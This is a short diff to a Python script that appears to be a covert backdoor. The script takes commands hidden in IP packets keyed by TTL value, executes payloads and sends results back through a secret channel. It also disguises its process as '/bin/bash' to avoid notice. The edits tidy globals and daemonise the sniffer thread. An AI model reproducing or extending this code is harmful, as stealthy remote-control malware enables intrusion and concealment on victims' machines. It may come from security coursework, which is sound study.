@@ -79,9 +79,7 @@ def execPayload(command):
     secret_send(payload)
 
 def commandResult(packet):
-    global ttlKey
-    global args
-    global cipher
+    global TTLKEY
     global messages
     ttl = packet[IP].ttl
     if(packet.haslayer(IP) and ttl == TTLKEY):
@@ -108,7 +106,9 @@ setproctitle.setproctitle("/bin/bash") #set fake process name
 
 sniffThread = threading.Thread(target=commandSniffer)
 fileMonitor = Monitor()
+
 fileMonitor.daemon = True
+sniffThread.daemon = True
 
 sniffThread.start()
 #fileMonitor.start()
